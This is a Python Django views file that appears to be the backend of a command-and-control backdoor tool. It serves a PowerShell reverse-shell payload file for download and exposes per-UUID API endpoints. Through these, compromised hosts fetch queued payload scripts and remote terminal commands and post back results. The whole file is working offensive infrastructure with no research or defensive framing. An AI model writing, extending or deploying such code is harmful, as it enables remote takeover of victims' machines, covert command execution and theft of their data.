from django.shortcuts import render
from django.http import HttpResponse, FileResponse
from django.utils.encoding import smart_str
from mimetypes import guess_type
from rest_framework import status
from rest_framework.decorators import api_view
from rest_framework.response import Response
from django.views.decorators.csrf import csrf_exempt
from connections.models import Connection, ScriptData, TerminalData


def download_payload(request):
    file_path = './payloads/Reverse_Shell.ps1'
    with open(file_path, 'rb') as f:
        response = HttpResponse(f, content_type=guess_type(file_path)[0])
        response['Content-Disposition'] = 'attachment; filename=Reverse_Shell.ps1'
        response['Content-Length'] = len(response.content)
        return response


@api_view(['GET', 'POST'])
def backdoor_api(request, uuid):
    if request.method == 'GET':
        try:
            connection = Connection.objects.get(uuid=uuid)
            script_data = ScriptData.objects.get(connection_id=connection)
            script = {'active': True, 'uuid': str(script_data.connection_id.uuid).upper(), 'payload': script_data.input,
                      'payload_name': script_data.payload_name, 'terminal': False}
        except:
            script = {'active': False, 'uuid': 'None'}
        return Response(script)

    if request.method == 'POST':
        print(f'POST IS: {request.POST}')
        return Response(request.POST)


@api_view(['GET', 'POST'])
def terminal_api(request, uuid):
    if request.method == 'GET':
        try:
            connection = Connection.objects.get(uuid=uuid)
            print(connection)
            terminal_data = TerminalData.objects.get(connection_id=connection)
            terminal = {'active': True, 'uuid': str(terminal_data.connection_id.uuid).upper(), 'input': terminal_data.input,
                        'terminal': True}
        except:
            terminal = {'active': False, 'uuid': 'None'}
        return Response(terminal)

    if request.method == 'POST':
        print(f'POST IS: {request.POST}')
        return Response(request.POST)